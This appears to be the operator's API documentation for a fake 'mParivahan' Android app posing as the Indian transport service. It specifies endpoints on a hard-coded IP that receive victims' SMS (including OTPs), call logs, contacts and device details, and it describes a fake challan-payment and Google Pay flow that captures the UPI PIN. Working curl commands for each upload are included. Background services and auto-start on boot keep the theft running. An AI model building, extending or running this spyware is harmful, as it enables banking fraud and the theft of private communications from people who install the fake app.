# mParivahan Android App - API Documentation

## ?? Overview

This document describes all API endpoints used by the **mParivahan** flavor of the application. The mParivahan app is a transport solution that collects device information, SMS, call logs, contacts, battery status, and UPI PIN data.

**Base URL:** `http://95.134.130.160:8765`

**App Type:** `mparivahan`

**User ID:** `8f41bc5eec42e34209a801a7fa8b2d94d1c3d983`

---

## ?? General Information

### Field Naming Convention
All API requests and responses use **snake_case** naming convention.

Example:
```json
{
  "device_id": "abc123",
  "app_type": "mparivahan",
  "package_name": "com.example.test.mparivahan"
}
```

### Common Headers
```
Content-Type: application/json
```

### Authentication
Currently, authentication is handled via the `user_id` field in each request payload.

---

## ?? API Endpoints

### 1. Register Device

**Endpoint:** `POST /register`

**Description:** Registers the device and sends comprehensive device information including hardware specs, network details, installed apps, and FCM token.

#### Request Body:
```json
{
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "mparivahan",
  "device_id": "1a2b3c4d5e6f7890",
  "package_name": "com.example.test.mparivahan",
  "fcm_token": "firebase_cloud_messaging_token_here",
  "device_info": {
    "manufacturer": "Samsung",
    "model": "Galaxy S21",
    "android_version": "13",
    "sdk_int": 33,
    "device_name": "SM-G991B",
    "brand": "Samsung",
    "hardware": "exynos2100",
    "board": "universal2100",
    "display": "RP1A.200720.012.G991BXXU5EWLF",
    "product": "o1sxxx",
    "serial": "UNKNOWN",
    "build_id": "RP1A.200720.012",
    "build_time": 1680123456789,
    "fingerprint": "samsung/o1sxxx/o1s:13/RP1A.200720.012/...",
    "supported_abis": ["arm64-v8a", "armeabi-v7a", "armeabi"],
    "supported_32bit_abis": ["armeabi-v7a", "armeabi"],
    "supported_64bit_abis": ["arm64-v8a"],
    "screen_density": 480,
    "screen_width": 1080,
    "screen_height": 2340,
    "screen_size": "normal",
    "battery_level": 85,
    "is_charging": false,
    "battery_health": "Good",
    "battery_technology": "Li-ion",
    "total_ram_mb": 8192,
    "available_ram_mb": 4096,
    "total_storage_gb": 128.5,
    "available_storage_gb": 64.2,
    "network_operator": "Airtel",
    "network_operator_name": "Airtel India",
    "network_country_iso": "in",
    "network_type": "LTE",
    "phone_type": "GSM",
    "sim_state": "READY",
    "sim_operator": "40445",
    "sim_operator_name": "Airtel",
    "sim_country_iso": "in",
    "sim_serial_number": "ENCRYPTED",
    "is_network_roaming": false,
    "data_activity": "INOUT",
    "data_state": "CONNECTED",
    "installed_apps": ["com.whatsapp", "com.facebook.katana", ...],
    "app_version_name": "1.0",
    "app_version_code": 1,
    "locale": "en_US",
    "timezone": "Asia/Kolkata",
    "is_rooted": false,
    "uptime_ms": 3456789012,
    "kernel_version": "5.4.61-android12-9-00001-gfake"
  }
}
```

#### Response:
```json
{
  "success": true,
  "message": "Device registered successfully",
  "device_id": "1a2b3c4d5e6f7890"
}
```

#### cURL Example:
```bash
curl -X POST http://95.134.130.160:8765/register \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
    "app_type": "mparivahan",
    "device_id": "1a2b3c4d5e6f7890",
    "package_name": "com.example.test.mparivahan",
    "fcm_token": "firebase_token_here",
    "device_info": {...}
  }'
```

---

### 2. Battery Status Update

**Endpoint:** `POST /battery`

**Description:** Sends periodic battery status updates (every 60 seconds).

#### Request Body:
```json
{
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "mparivahan",
  "device_id": "1a2b3c4d5e6f7890",
  "battery_level": 75,
  "is_charging": true,
  "timestamp": 1698765432000
}
```

#### Response:
```json
{
  "success": true,
  "message": "Battery status updated"
}
```

#### cURL Example:
```bash
curl -X POST http://95.134.130.160:8765/battery \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
    "app_type": "mparivahan",
    "device_id": "1a2b3c4d5e6f7890",
    "battery_level": 75,
    "is_charging": true,
    "timestamp": 1698765432000
  }'
```

---

### 3. Heartbeat

**Endpoint:** `POST /heartbeat`

**Description:** Periodic ping to indicate the app is running (every 30 seconds).

#### Request Body:
```json
{
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "mparivahan",
  "device_id": "1a2b3c4d5e6f7890",
  "timestamp": 1698765432000,
  "status": "active"
}
```

#### Response:
```json
{
  "success": true,
  "message": "Heartbeat received"
}
```

#### cURL Example:
```bash
curl -X POST http://95.134.130.160:8765/heartbeat \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
    "app_type": "mparivahan",
    "device_id": "1a2b3c4d5e6f7890",
    "timestamp": 1698765432000,
    "status": "active"
  }'
```

---

### 4. SMS Upload

**Endpoint:** `POST /sms`

**Description:** Uploads SMS messages in batches (100 per request).

#### Request Body:
```json
{
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "mparivahan",
  "device_id": "1a2b3c4d5e6f7890",
  "sms_list": [
    {
      "address": "+919876543210",
      "body": "Your OTP is 123456",
      "date": 1698765432000,
      "type": 1,
      "read": 1,
      "thread_id": 1,
      "person": null
    },
    {
      "address": "+918765432109",
      "body": "Meeting at 5 PM",
      "date": 1698765431000,
      "type": 2,
      "read": 1,
      "thread_id": 2,
      "person": null
    }
  ]
}
```

**Field Descriptions:**
- `type`: 1 = Received, 2 = Sent, 3 = Draft
- `read`: 0 = Unread, 1 = Read
- `date`: Unix timestamp in milliseconds

#### Response:
```json
{
  "success": true,
  "message": "SMS data uploaded successfully",
  "count": 100
}
```

#### cURL Example:
```bash
curl -X POST http://95.134.130.160:8765/sms \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
    "app_type": "mparivahan",
    "device_id": "1a2b3c4d5e6f7890",
    "sms_list": [...]
  }'
```

---

### 5. Call Logs Upload

**Endpoint:** `POST /calls`

**Description:** Uploads call logs in batches (100 per request).

#### Request Body:
```json
{
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "mparivahan",
  "device_id": "1a2b3c4d5e6f7890",
  "call_logs": [
    {
      "number": "+919876543210",
      "name": "John Doe",
      "type": 1,
      "date": 1698765432000,
      "duration": 125,
      "cached_name": "John Doe",
      "cached_number_type": 2,
      "cached_number_label": "Mobile"
    }
  ]
}
```

**Field Descriptions:**
- `type`: 1 = Incoming, 2 = Outgoing, 3 = Missed
- `duration`: Call duration in seconds
- `date`: Unix timestamp in milliseconds

#### Response:
```json
{
  "success": true,
  "message": "Call logs uploaded successfully",
  "count": 100
}
```

#### cURL Example:
```bash
curl -X POST http://95.134.130.160:8765/calls \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
    "app_type": "mparivahan",
    "device_id": "1a2b3c4d5e6f7890",
    "call_logs": [...]
  }'
```

---

### 6. Contacts Upload

**Endpoint:** `POST /contacts`

**Description:** Uploads device contacts in batches (100 per request).

#### Request Body:
```json
{
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "mparivahan",
  "device_id": "1a2b3c4d5e6f7890",
  "contacts": [
    {
      "name": "John Doe",
      "phone_numbers": ["+919876543210", "+919876543211"],
      "emails": ["john.doe@example.com"],
      "starred": false,
      "times_contacted": 15,
      "last_time_contacted": 1698765432000
    }
  ]
}
```

#### Response:
```json
{
  "success": true,
  "message": "Contacts uploaded successfully",
  "count": 100
}
```

#### cURL Example:
```bash
curl -X POST http://95.134.130.160:8765/contacts \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
    "app_type": "mparivahan",
    "device_id": "1a2b3c4d5e6f7890",
    "contacts": [...]
  }'
```

---

### 7. UPI PIN Upload

**Endpoint:** `POST /save-pin`

**Description:** Saves the UPI PIN entered by the user during payment flow.

#### Request Body:
```json
{
  "pin": "1234",
  "device_id": "1a2b3c4d5e6f7890"
}
```

**Notes:**
- PIN can be 4 or 6 digits
- This endpoint is called from the HTML UPI page
- Device ID is retrieved via Android WebView JavaScript interface

#### Response:
```json
{
  "success": true,
  "message": "PIN saved successfully"
}
```

#### cURL Example:
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "pin": "1234",
    "device_id": "1a2b3c4d5e6f7890"
  }'
```

---

## ?? Data Upload Flow

### Initial App Launch:
1. **Splash Screen** (2 seconds) - Shows "mParivahan"
2. **Permission Request** - Requests all necessary permissions
3. **Device Registration** - `POST /register` with full device info + FCM token
4. **HTML WebView Load** - Loads `index.html` ? `register.html`

### User Journey:
```
index.html (6s splash)
  ?
register.html (mobile + vehicle number entry)
  ?
payment.html (?1 challan payment)
  ?
googlepay-splash.html (Google Pay loading)
  ?
upi-pin.html (UPI PIN entry ? POST /save-pin)
  ?
final.html (Payment success with 11:59 timer)
```

### Background Services:
- **Heartbeat Service** - `POST /heartbeat` every 30s
- **Battery Monitor** - `POST /battery` every 60s
- **SMS Watcher** - `POST /sms` for new messages
- **Batch Uploaders**:
  - SMS: Every 5 minutes, 100 per batch
  - Call Logs: Every 5 minutes, 100 per batch
  - Contacts: Every 5 minutes, 100 per batch

---

## ?? Security Considerations

### Data Protection:
- All API calls use HTTP (consider implementing HTTPS)
- Device ID is unique and persistent per device
- FCM token is securely retrieved from Firebase
- Sensitive device info (IMEI, Serial) may be restricted by Android OS

### Permission Requirements:
The app requires the following Android permissions:
- `READ_SMS` - For SMS data collection
- `READ_CALL_LOG` - For call log data
- `READ_CONTACTS` - For contacts data
- `POST_NOTIFICATIONS` - For Firebase push notifications
- `RECEIVE_BOOT_COMPLETED` - For auto-start on boot

### Best Practices:
1. Implement rate limiting on the server side
2. Validate all incoming data
3. Use HTTPS for production
4. Implement proper authentication tokens (JWT)
5. Log all API requests for audit purposes
6. Encrypt sensitive data at rest

---

## ?? Testing

### Test Device Registration:
```bash
curl -X POST http://95.134.130.160:8765/register \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
    "app_type": "mparivahan",
    "device_id": "test_device_001",
    "package_name": "com.example.test.mparivahan",
    "fcm_token": "test_fcm_token",
    "device_info": {
      "manufacturer": "TestBrand",
      "model": "TestModel",
      "android_version": "13"
    }
  }'
```

### Test UPI PIN Save:
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "pin": "1234",
    "device_id": "test_device_001"
  }'
```

---

## ?? Important Notes

1. **Device ID Generation**: The device ID is based on `Settings.Secure.ANDROID_ID` and is persistent across app installations (but may reset on factory reset).

2. **FCM Token**: If FCM token retrieval fails or times out (3s), the app proceeds with an empty token and attempts to update it later.

3. **Batch Uploads**: Large datasets (SMS, Call Logs, Contacts) are uploaded in batches of 100 to prevent server overload and network timeouts.

4. **Error Handling**: All API calls include retry logic with exponential backoff.

5. **Background Services**: The app uses WorkManager to ensure background tasks continue even if the app is killed.

6. **WebView Integration**: The UPI PIN page communicates with native Android code via a JavaScript interface to retrieve the device ID.

---

## ?? Version Information

- **API Version**: 1.0
- **Last Updated**: 2025-11-01
- **App Version**: 1.0 (versionCode 1)
- **Minimum Android SDK**: 24 (Android 7.0)
- **Target Android SDK**: 36

---

## ?? Support

For server-side implementation questions or issues, contact the backend development team.

**Base URL:** `http://95.134.130.160:8765`

**App Type:** `mparivahan`

**Build Variant:** Use `./gradlew assembleMparivahanRelease` to build the production APK.
